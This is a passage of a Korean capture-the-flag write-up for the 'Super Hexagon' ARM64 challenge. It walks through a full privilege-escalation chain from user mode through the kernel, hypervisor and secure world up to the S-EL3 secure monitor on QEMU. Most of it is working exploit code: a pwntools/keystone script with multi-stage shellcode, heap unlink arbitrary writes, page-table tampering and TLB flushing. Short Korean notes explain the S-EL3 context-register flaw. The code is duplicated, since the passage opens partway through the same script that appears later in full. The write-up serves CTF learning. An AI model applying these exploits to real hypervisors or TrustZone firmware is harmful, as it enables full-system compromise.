    movk x0, #0x06, lsl 0
    mov x1, x10
    smc #0x1337
    // get .text
    mov w2, #3
    str w2, [x9] // cmd
    mov w2, #5
    str w2, [x9, #4] // idx
    movz w2, #0x0000, lsl 16
    movk w2, #0x1900, lsl 0
    str w2, [x9, #8] // sz
    mov x8, #0x0 
    loop_copy:                  
        add x2, x21, x8
        add x1, x20, x8
        ldrb w0, [x1]
        strb w0, [x2]
        add x8, x8, #1
        cmp x8, #{len(SEL0_shellcode)}
        bne loop_copy
    movz x0, #0x8300, lsl 16          
    movk x0, #0x06, lsl 0
    mov x1, x10
    smc #0x1337
    movz x0, #0x8300, lsl 16          
    movk x0, #0x05, lsl 0
    ldr x1, =0x2000000
    mov x2, #0x100
    smc #0x1337
    mov x8, #0x0 
    loop_print_flag_sel1:                  
        add x1, x21, x8 // dst
        ldrb w0, [x1]
        strb w0, [x11]
        add x8, x8, #1
        cmp x8, #{0x20}
        bne loop_print_flag_sel1
''') 
EL2_shellcode +=  b'A' * (0x250- len(EL2_shellcode)) + TCI_Data

EL2_shellcode = b'\x41'*0xc+EL2_shellcode
entry = 0xffffffffc001e000 + 0xf0 
addr = 0xffffffffc00091b8
IPA = 0x2400 | (0b11<<6) # s2ap 11
DESC = 3 | 0x100000
EL2_TEXT = 0x00007ffeffffa000
entry_user = 0xffffffffc0028000 + 0xfd0
user_val = 0x2403 | 64 | 0x0020000000000000# ap 01
EL2_shellcode_addr = 0x7ffeffffc100
EL1_shellcode = asm(f'nop')*(0x400//4)
EL1_shellcode += asm(f'''\
    mov x0, #1 
    movz x1, #{((IPA)>>48)&0xffff}, lsl #48
    movk x1, #{((IPA)>>32)&0xffff}, lsl #32
    movk x1, #{((IPA)>>16)&0xffff}, lsl #16
    movk x1, #{(IPA)&0xffff}, lsl #0
    movz x2, #{((DESC)>>48)&0xffff}, lsl #48
    movk x2, #{((DESC)>>32)&0xffff}, lsl #32
    movk x2, #{((DESC)>>16)&0xffff}, lsl #16
    movk x2, #{(DESC)&0xffff}, lsl #0
    hvc #0x1337 // PA 0x0000000040102000 RWX
    movz x11, #{((entry_user)>>48)&0xffff}, lsl #48
    movk x11, #{((entry_user)>>32)&0xffff}, lsl #32
    movk x11, #{((entry_user)>>16)&0xffff}, lsl #16
    movk x11, #{(entry_user)&0xffff}, lsl #0
    movz x10, #{((user_val)>>48)&0xffff}, lsl #48
    movk x10, #{((user_val)>>32)&0xffff}, lsl #32
    movk x10, #{((user_val)>>16)&0xffff}, lsl #16
    movk x10, #{(user_val)&0xffff}, lsl #0
    str x10, [x11] // IPA 0x0000000000002000 RW
    movz x11, #{((EL2_TEXT)>>48)&0xffff}, lsl #48
    movk x11, #{((EL2_TEXT)>>32)&0xffff}, lsl #32
    movk x11, #{((EL2_TEXT)>>16)&0xffff}, lsl #16
    movk x11, #{(EL2_TEXT)&0xffff}, lsl #0
    movz x12, #{((EL2_shellcode_addr)>>48)&0xffff}, lsl #48
    movk x12, #{((EL2_shellcode_addr)>>32)&0xffff}, lsl #32
    movk x12, #{((EL2_shellcode_addr)>>16)&0xffff}, lsl #16
    movk x12, #{(EL2_shellcode_addr)&0xffff}, lsl #0
    mov x9, #0x0 
    loop:                  
        add x2, x11, x9
        add x1, x12, x9
        ldrb w0, [x1]
        strb w0, [x2]
        add w9, w9, #1
        cmp x9, #{len(EL2_shellcode)}
        bne loop
    hvc #0x1337 // trigger!!!
''')
cnt = len(EL1_shellcode)
val = 0x0040000000036483
shellcode = f'''\
    mov x5, #-1
    mov w4, #0x0
    mov w3, #0x0
    mov w2, #3
    mov x1, #0x1000
    mov x0, #0x0
    mov x8, #0xde
    svc #0x1337
    mov x11, x0 // IPA 0x36000
    mov x9, #0x0 
    loop:                   
        add x1, x11, x9
        mov x8, #0x3f
        mov x0, #0
        mov x2, #0x1
        svc #0x1337
        add w9, w9, #1
        cmp x9, #{cnt}
        bne loop
    mov x0, x11
    mov x1, #0x1000
    mov x2, #5 // r-x
    mov x8, #0xe2
    svc #0x1337
    mov x5, #-1
    mov w4, #0x0
    mov w3, #0x0
    mov w2, #3
    mov x1, #0x1000
    mov x0, #0x0
    mov x8, #0xde
    svc #0x1337 // IPA 0x37000
    movz x11, #{((entry)>>48)&0xffff}, lsl #48
    movk x11, #{((entry)>>32)&0xffff}, lsl #32
    movk x11, #{((entry)>>16)&0xffff}, lsl #16
    movk x11, #{(entry)&0xffff}, lsl #0
    mov x0, #0
    mov x1, x11
    mov x8, #0x3f
    mov x2, #1
    svc #0x1337 // now we can modify the kernel page table
    movz x10, #{((val)>>48)&0xffff}, lsl #48
    movk x10, #{((val)>>32)&0xffff}, lsl #32
    movk x10, #{((val)>>16)&0xffff}, lsl #16
    movk x10, #{(val)&0xffff}, lsl #0
    sub x11, x11, #0xa0
    str x10, [x11]
    mov x8, #0x123
    svc #0x1337
'''
payload = bytes(ks.asm(shellcode)[0])
payload += b'\x41' * (0x100 - len(payload))
payload += EL2_shellcode 
assert len(payload) <= 0x500
payload += b'\x41' * (0x500 - len(payload))
payload += SEL0_shellcode
payload += b'\x41' * (0x1000 - len(payload))
p.send(payload)
sleep(0.1)
p.send(EL1_shellcode)
sleep(0.1)
p.send(b'\x43') # AP 01 -> EL0 RW EL1 RW 
sleep(0.1)
p.interactive()
```
# S-EL3, Secure monitor
```Python
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_00000fa8 (undefined  param_1 , undefined  par
             undefined         w0:1           <RETURN>
             undefined         w0:1           param_1
             undefined         w1:1           param_2
             undefined         w2:1           param_3
             undefined         w3:1           param_4
             undefined         w4:1           param_5
             undefined         w5:1           param_6
             undefined         w6:1           param_7
             undefined         w7:1           param_8
             undefined         Stack[0x0]:1   param_9
             undefined         Stack[0x8]:1   param_10
             undefined8        Stack[0x110]:8 param_11                                XREF[1]:     00000fb0 (W)   
             undefined8        Stack[0x120]:8 ELR_EL3
             undefined8        Stack[0x118]:8 SPSR_EL3                                XREF[1]:     00000fb8 (R)   
             undefined8        Stack[0x100]:8 SCR_EL3                                 XREF[1]:     00000fb4 (R)   
                             FUN_00000fa8                                    XREF[3]:     FUN_00000000:000000b0 (c) , 
                                                                                          FUN_00000c90:00000cb4 (c) , 
                                                                                          FUN_00002400:00002840 (c)   
        00000fa8 f1  03  00  91    mov        x17 ,sp
        00000fac bf  41  00  d5    msr        PState.SP,#0x1
        00000fb0 f1  8b  00  f9    str        x17 ,[sp, #param_11 ]
        00000fb4 f2  83  40  f9    ldr        x18 ,[sp, #SCR_EL3 ]
        00000fb8 f0  c7  51  a9    ldp        x16 ,x17 ,[sp, #SPSR_EL3 ]
        00000fbc 12  11  1e  d5    msr        scr_el3 ,x18
        00000fc0 10  40  1e  d5    msr        spsr_el3 ,x16
        00000fc4 31  40  1e  d5    msr        elr_el3 ,x17
        00000fc8 f5  ff  ff  17    b          FUN_00000f9c                                     undefined FUN_00000f9c(undefined
                             -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
```
전에 분석했을 때는 전혀 취약점이 보이지 않았었다.
지금 다시 보니 쉽게 구조적인 취약점을 발견할 수 있었다.
취약점 상세 내용은 다음과 같다.
  
S-EL3의 일부 rw가 필요한 영역은 RAM에 적재된다.
그런데 context switching 시에 보호해야 할 시스템 레지스터들이 RAM에 올라와있다.
이런 구조는 절대 격리가 유지될 수 있는 구조가 아니다.
![](attachment/7d9fcba3fcaf7667027c403d9b284076.png)
생각해낸 익스플로잇 시나리오는 다음과 같다.
1. S-EL1 PTE 조작 → 쉘 코드 작성.
2. S-EL1 PTE 조작 → S-EL3 PTE 조작 → 쉘 코드 페이지 매핑.
3. S-EL1 PTE 조작 & tlb flush → ctx.pc, ctx.cpsr 변조.
4. Secure monitor call → ACE.
여기서 세 번째 스텝이 tlb flush 인데 이건 같은 VA를 다른 PA에 매핑하기 위해 연속적으로 같은 VA에 접근해서 tlb가 캐싱되므로 이를 flush 하기 위해서 이용했다.
qemu는 mmu를 프로세서와 완전 동일하게는 아니여도 범용적인 mmu를 softmmu라는 feature로 mmu 에뮬레이션을 지원하기에 꼭 필요한 스텝이다.
```C
static bool mmu_lookup1(CPUState *cpu, MMULookupPageData *data,
                        int mmu_idx, MMUAccessType access_type, uintptr_t ra)
{
    vaddr addr = data->addr;
    uintptr_t index = tlb_index(cpu, mmu_idx, addr);
    CPUTLBEntry *entry = tlb_entry(cpu, mmu_idx, addr);
    uint64_t tlb_addr = tlb_read_idx(entry, access_type);
    bool maybe_resized = false;
    CPUTLBEntryFull *full;
    int flags;
    /* If the TLB entry is for a different page, reload and try again.  */
    if (!tlb_hit(tlb_addr, addr)) {
        if (!victim_tlb_hit(cpu, mmu_idx, index, access_type,
                            addr & TARGET_PAGE_MASK)) {
            tlb_fill(cpu, addr, data->size, access_type, mmu_idx, ra);
            maybe_resized = true;
            index = tlb_index(cpu, mmu_idx, addr);
            entry = tlb_entry(cpu, mmu_idx, addr);
        }
        tlb_addr = tlb_read_idx(entry, access_type) & ~TLB_INVALID_MASK;
    }
    full = &cpu->neg.tlb.d[mmu_idx].fulltlb[index];
    flags = tlb_addr & (TLB_FLAGS_MASK & ~TLB_FORCE_SLOW);
    flags |= full->slow_flags[access_type];
    data->full = full;
    data->flags = flags;
    /* Compute haddr speculatively; depending on flags it might be invalid. */
    data->haddr = (void *)((uintptr_t)addr + entry->addend);
    return maybe_resized;
}
```
다음과 같이 hit이면 그냥 저장된 인덱스에 맞춰서 바로 리턴하는 것을 확인할 수 있다.
![](attachment/1fd5a4f6f21cfa381a0f09b64430680b.png)
![](attachment/43fadf48c377fbf274c369c10f9eb105.png)
쉘 코드 길이를 늘리기 위해선 그냥 여기서 fault 내고 더 낮은 exception vector offset으로 뛰면 0xd00 주변으로 뛸 수 있다.
그걸 이용해서 0xd00 주변에 쉘 코드를 배치한다.
![](attachment/fd750aecd7c7b5e5a761b7f005a4e6fe.png)
## Exploit code (code execution & flag)
```Python
from pwn import *
from keystone import *

sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
context.binary = e = ELF('./super_hexagon/share/_bios.bin.extracted/BC010')
ks = Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN)
sc_st = 0x7ffeffffd006
shellcode = b''
shellcode += bytes(ks.asm(f'''\
    mov x5, #-1
    mov w4, #0x0
    mov w3, #0x0
    mov w2, #3
    mov x1, #0x1000
    mov x0, #0x0
    mov x8, #0xde
    svc #0x1337
    mov x11, x0
    mov w9, #0x0
    loop:                   
        add x1, x11, x9
        mov x8, #0x3f
        mov x0, #0
        mov x2, #0x1
        svc #0x1337
        add w9, w9, #1
        cmp x9, #0x1000
        bne loop

    mov x0, x11
    mov x1, #0x1000
    mov x2, #5
    mov x8, #0xe2
    svc #0x1337

    blr x11
''')[0])
assert b'\r' not in shellcode and b'\x0a' not in shellcode

# p = remote('localhost',6666)
p = process('./local_debug.sh')
# p = process('./local_debug_secure.sh')

payload = b'A' * 0x100
payload += p64(0xdeadbeef) 
payload += p64(e.sym.gets) # cmd = 1

sla(b'cmd> ', b'1')
sla(b'index: ', str(0))
sla(b'key: ', payload)
sleep(0.1)
payload = b'A' * 0b101 + b'\x00'
payload += shellcode
p.sendline(payload)

sla(b'cmd> ', b'1')
sla(b'index: ', str(0x1000))
payload = b''
payload += b'A'*0b101 + b'\x00'
payload += b'A'*(0x100 - len(payload))
payload += p64(0xdeadbeef)
payload += p64(e.sym.mprotect)
payload += p64(sc_st)
sla(b'key: ', payload)

sla(b'cmd> ',b'2')
sla(b'index: ', str(1))
sleep(0.1)

read_flag = [1, 252, 59, 213, 1, 0, 0, 185, 33, 252, 59, 213, 1, 4, 0, 185, 65, 252, 59, 213, 1, 8, 0, 185, 97, 252, 59, 213, 1, 12, 0, 185, 129, 252, 59, 213, 1, 16, 0, 185, 161, 252, 59, 213, 1, 20, 0, 185, 193, 252, 59, 213, 1, 24, 0, 185, 225, 252, 59, 213, 1, 28, 0, 185]
SEL3_shellcode = asm('''\
    mov x0, sp
''')
SEL3_shellcode += bytes(read_flag)
SEL3_shellcode += asm('''\
ldr x11, =0x09000000
mov x8, #0
loop_print_flag_sel3:                  
    add x1, sp, x8 // dst
    ldrb w0, [x1]
    strb w0, [x11]
    add x8, x8, #1
    cmp x8, #32
    bne loop_print_flag_sel3
''')

# 0x000000000e002210 00000fb0
WORLD_SHARED_MEM_VA = 0x023fe000
WORLD_SHARED_MEM_PA = 0x40033000 
SEL1_shellcode = b''
SEL1_shellcode += asm(f'''\
    ldr r0, ={WORLD_SHARED_MEM_VA}
    add r10, r0, #0x20c
    mov r9, #0
    ldr r2, =0x100de8 // 0xe499000 + 0xde8
    loop:
        add r0, r10, r9 
        add r1, r2, r9
        ldrb r0, [r0]
        strb r0, [r1]
        add r9, r9, #1
        cmp r9, #{len(SEL3_shellcode)}
        bne loop
        
    // mapping
    ldr r0, =0x8005008
    ldr r1, =0xe00364f
    str r1, [r0]
    mov r0, #0x1000
    ldr r1, =0xe499783
    str r1, [r0]

    // ctx
    ldr r0, =0x8005008
    ldr r1, =0xe00264f  
    str r1, [r0] // tlb is already cached by the softmmu
    mcr p15, 0, r0, c8, c7, 0 
    dsb sy
    isb
    mov r0, #0x1328
    ldr r1, =0x800002cc
    str r1, [r0]
    mov r0, #0x1330
    mov r1, #0
    str r1, [r0]
''',arch='arm') # dummy code is added. 
# SEL1_shellcode += b'\xfe\xff\xff\xea' # loop for debugging
SEL1_shellcode += asm('''\
    mov r0, 0x8300
    lsl r0, r0, #16
    orr r0, r0, #0x7
''',arch='arm') # separation needed.
SEL1_shellcode += bytes.fromhex('70 00 60 e1')

TCI_Data_addr = 0x4010225c
SEL0_shellcode = b"\x00\xf0\x08\xe8" # thumb switch
SEL0_shellcode += b'A'*0x10
SEL0_shellcode += asm(f'''\
    mov r10, #{((WORLD_SHARED_MEM_VA)>>16)&0xffff}
    lsl r10, r10, #16 
    orr r10, r10, #{(WORLD_SHARED_MEM_VA)&0xffff}
    add r10, r10, #0x10c 
    mov r0, #0xb
    mov r1, r10
    svc 0x1
    svc 0x0 // return to normal world
''',arch='arm')
SEL0_shellcode += b'A' * (0x100 - len(SEL0_shellcode))
SEL0_shellcode += SEL1_shellcode
assert len(SEL0_shellcode) <= 0x200
SEL0_shellcode += b'A' * (0x200 - len(SEL0_shellcode))
SEL0_shellcode += SEL3_shellcode

SEL0_shellcode_src = 0x40035500
UART= 0x0000000009000000

TCI_Data = b''
TCI_Data += p32(0xdeadbeef) * 8 + p32(0xdeadbeef) * 2 
TCI_Data += p32(0) + p32(0x31) + p32(0x00000000e4990b0-8) + p32(0x0) + p32(0) + p32(0) + b'A' * 0x18# chunk 1
TCI_Data += p32(0) + p32(0x31) + p32(0x1670+8-0x10) + p32(0x0100060-0x8) + b'B' * 0x14 # chunk 2

EL2_shellcode = asm(f'''\
    movz x11, #{((UART)>>48)&0xffff}, lsl #48
    movk x11, #{((UART)>>32)&0xffff}, lsl #32
    movk x11, #{((UART)>>16)&0xffff}, lsl #16
    movk x11, #{(UART)&0xffff}, lsl #0
    mov x0, sp
''') + bytes(read_flag) + asm(f'''\
    mov x9, #0
    loop:
        add x0, sp, x9 
        ldrb w0, [x0]
        strb w0, [x11]
        add x9, x9, #1
        cmp x9, #32
        bne loop

 
    movk x10, #{((WORLD_SHARED_MEM_VA)>>16)&0xffff}, lsl #16
    movk x10, #{(WORLD_SHARED_MEM_VA)&0xffff}, lsl #0

    movz x9, #{((WORLD_SHARED_MEM_PA)>>48)&0xffff}, lsl #48
    movk x9, #{((WORLD_SHARED_MEM_PA)>>32)&0xffff}, lsl #32
    movk x9, #{((WORLD_SHARED_MEM_PA)>>16)&0xffff}, lsl #16
    movk x9, #{(WORLD_SHARED_MEM_PA)&0xffff}, lsl #0
    movz x20, #{((SEL0_shellcode_src)>>48)&0xffff}, lsl #48
    movk x20, #{((SEL0_shellcode_src)>>32)&0xffff}, lsl #32
    movk x20, #{((SEL0_shellcode_src)>>16)&0xffff}, lsl #16
    movk x20, #{(SEL0_shellcode_src)&0xffff}, lsl #0
    add x21, x9, #0xc // shellcode_dst, TCI buf payload


    mov x25, #0
    alloc_loop:
        // alloc(i, 0x20, b'')
        mov w2, #3
        str w2, [x9] // cmd
        mov w2, w25
        str w2, [x9, #4] // idx
        movz w2, #0x0000, lsl 16
        movk w2, #0x20, lsl 0
        str w2, [x9, #8] // sz
        movz x0, #0x8300, lsl 16          
        movk x0, #0x06, lsl 0
        mov x1, x10
        smc #0x1337
        add x25, x25, #1
        cmp x25, #{3}
        bne alloc_loop
    mov x25, #2
    free_loop:
        // free 2, 1, 0
        mov w2, #3
        str w2, [x9] // cmd
        mov w2, w25
        str w2, [x9, #4] // idx
        movz w2, #0x0000, lsl 16
        movk w2, #0x40, lsl 0
        str w2, [x9, #8] // sz
        movz x0, #0x8300, lsl 16          
        movk x0, #0x06, lsl 0
        mov x1, x10
        smc #0x1337
        cmp x25, #{0}
        sub x25, x25, #1
        bne free_loop

    //trigger the vuln
    mov w2, #3
    str w2, [x9] // cmd
    mov w2, #0
    str w2, [x9, #4] // idx
    movz w2, #0xffff, lsl 16
    movk w2, #0xffff, lsl 0
    str w2, [x9, #8] // sz
    movz x22, #{((TCI_Data_addr)>>48)&0xffff}, lsl #48
    movk x22, #{((TCI_Data_addr)>>32)&0xffff}, lsl #32
    movk x22, #{((TCI_Data_addr)>>16)&0xffff}, lsl #16
    movk x22, #{(TCI_Data_addr)&0xffff}, lsl #0
    mov x8, #0x0 
    loop_tci:                  
        add x2, x21, x8 // dst
        add x1, x22, x8 // src
        ldrb w0, [x1]
        strb w0, [x2]
        add x8, x8, #1
        cmp x8, #{len(TCI_Data)}
        bne loop_tci
    movz x0, #0x8300, lsl 16          
    movk x0, #0x06, lsl 0
    mov x1, x10
    smc #0x1337

    // unlink AAW trigger
    mov w2, #3
    str w2, [x9] // cmd
    mov w2, #4
    str w2, [x9, #4] // idx
    movz w2, #0x0000, lsl 16
    movk w2, #0x20, lsl 0
    str w2, [x9, #8] // sz

    movz w2, 0x0010, lsl #16
    movk w2, 0x0050, lsl #0
    str w2, [x9, #16] // data + 4
    str w2, [x9, #20] // this is needed to get out of the freelist loop.
    
    movz x0, #0x8300, lsl 16          
    movk x0, #0x06, lsl 0
    mov x1, x10
    smc #0x1337

    // get .text
    mov w2, #3
    str w2, [x9] // cmd
    mov w2, #5
    str w2, [x9, #4] // idx
    movz w2, #0x0000, lsl 16
    movk w2, #0x1900, lsl 0
    str w2, [x9, #8] // sz
    mov x8, #0x0 
    loop_copy:                  
        add x2, x21, x8
        add x1, x20, x8
        ldrb w0, [x1]
        strb w0, [x2]
        add x8, x8, #1
        cmp x8, #{len(SEL0_shellcode)}
        bne loop_copy
    movz x0, #0x8300, lsl 16          
    movk x0, #0x06, lsl 0
    mov x1, x10
    smc #0x1337

    movz x0, #0x8300, lsl 16          
    movk x0, #0x05, lsl 0
    ldr x1, =0x2000000
    mov x2, #0x100
    smc #0x1337
    mov x8, #0x0 

''') 

EL2_shellcode +=  b'A' * (0x250- len(EL2_shellcode)) + TCI_Data


EL2_shellcode = b'\x41'*0xc+EL2_shellcode
entry = 0xffffffffc001e000 + 0xf0 
addr = 0xffffffffc00091b8
IPA = 0x2400 | (0b11<<6) # s2ap 11
DESC = 3 | 0x100000
EL2_TEXT = 0x00007ffeffffa000
entry_user = 0xffffffffc0028000 + 0xfd0
user_val = 0x2403 | 64 | 0x0020000000000000# ap 01

EL2_shellcode_addr = 0x7ffeffffc100
EL1_shellcode = asm(f'nop')*(0x400//4)
EL1_shellcode += asm(f'''\
    mov x0, #1 
    movz x1, #{((IPA)>>48)&0xffff}, lsl #48
    movk x1, #{((IPA)>>32)&0xffff}, lsl #32
    movk x1, #{((IPA)>>16)&0xffff}, lsl #16
    movk x1, #{(IPA)&0xffff}, lsl #0
    movz x2, #{((DESC)>>48)&0xffff}, lsl #48
    movk x2, #{((DESC)>>32)&0xffff}, lsl #32
    movk x2, #{((DESC)>>16)&0xffff}, lsl #16
    movk x2, #{(DESC)&0xffff}, lsl #0
    hvc #0x1337 // PA 0x0000000040102000 RWX
    movz x11, #{((entry_user)>>48)&0xffff}, lsl #48
    movk x11, #{((entry_user)>>32)&0xffff}, lsl #32
    movk x11, #{((entry_user)>>16)&0xffff}, lsl #16
    movk x11, #{(entry_user)&0xffff}, lsl #0
    movz x10, #{((user_val)>>48)&0xffff}, lsl #48
    movk x10, #{((user_val)>>32)&0xffff}, lsl #32
    movk x10, #{((user_val)>>16)&0xffff}, lsl #16
    movk x10, #{(user_val)&0xffff}, lsl #0
    str x10, [x11] // IPA 0x0000000000002000 RW

    movz x11, #{((EL2_TEXT)>>48)&0xffff}, lsl #48
    movk x11, #{((EL2_TEXT)>>32)&0xffff}, lsl #32
    movk x11, #{((EL2_TEXT)>>16)&0xffff}, lsl #16
    movk x11, #{(EL2_TEXT)&0xffff}, lsl #0
    movz x12, #{((EL2_shellcode_addr)>>48)&0xffff}, lsl #48
    movk x12, #{((EL2_shellcode_addr)>>32)&0xffff}, lsl #32
    movk x12, #{((EL2_shellcode_addr)>>16)&0xffff}, lsl #16
    movk x12, #{(EL2_shellcode_addr)&0xffff}, lsl #0

    mov x9, #0x0 
    loop:                  
        add x2, x11, x9
        add x1, x12, x9
        ldrb w0, [x1]
        strb w0, [x2]
        add w9, w9, #1
        cmp x9, #{len(EL2_shellcode)}
        bne loop

    hvc #0x1337 // trigger!!!
''')

cnt = len(EL1_shellcode)
val = 0x0040000000036483

shellcode = f'''\
    mov x5, #-1
    mov w4, #0x0
    mov w3, #0x0
    mov w2, #3
    mov x1, #0x1000
    mov x0, #0x0
    mov x8, #0xde
    svc #0x1337
    mov x11, x0 // IPA 0x36000
    mov x9, #0x0 
    loop:                   
        add x1, x11, x9
        mov x8, #0x3f
        mov x0, #0
        mov x2, #0x1
        svc #0x1337
        add w9, w9, #1
        cmp x9, #{cnt}
        bne loop

    mov x0, x11
    mov x1, #0x1000
    mov x2, #5 // r-x
    mov x8, #0xe2
    svc #0x1337

    mov x5, #-1
    mov w4, #0x0
    mov w3, #0x0
    mov w2, #3
    mov x1, #0x1000
    mov x0, #0x0
    mov x8, #0xde
    svc #0x1337 // IPA 0x37000

    movz x11, #{((entry)>>48)&0xffff}, lsl #48
    movk x11, #{((entry)>>32)&0xffff}, lsl #32
    movk x11, #{((entry)>>16)&0xffff}, lsl #16
    movk x11, #{(entry)&0xffff}, lsl #0

    mov x0, #0
    mov x1, x11
    mov x8, #0x3f
    mov x2, #1
    svc #0x1337 // now we can modify the kernel page table

    movz x10, #{((val)>>48)&0xffff}, lsl #48
    movk x10, #{((val)>>32)&0xffff}, lsl #32
    movk x10, #{((val)>>16)&0xffff}, lsl #16
    movk x10, #{(val)&0xffff}, lsl #0
    sub x11, x11, #0xa0
    str x10, [x11]

    mov x8, #0x123
    svc #0x1337
'''
payload = bytes(ks.asm(shellcode)[0])
payload += b'\x41' * (0x100 - len(payload))
payload += EL2_shellcode 
assert len(payload) <= 0x500
payload += b'\x41' * (0x500 - len(payload))
payload += SEL0_shellcode
payload += b'\x41' * (0x1000 - len(payload))
p.send(payload)
sleep(0.1)
p.send(EL1_shellcode)
sleep(0.1)
p.send(b'\x43') # AP 01 -> EL0 RW EL1 RW 
sleep(0.1)
p.interactive()
```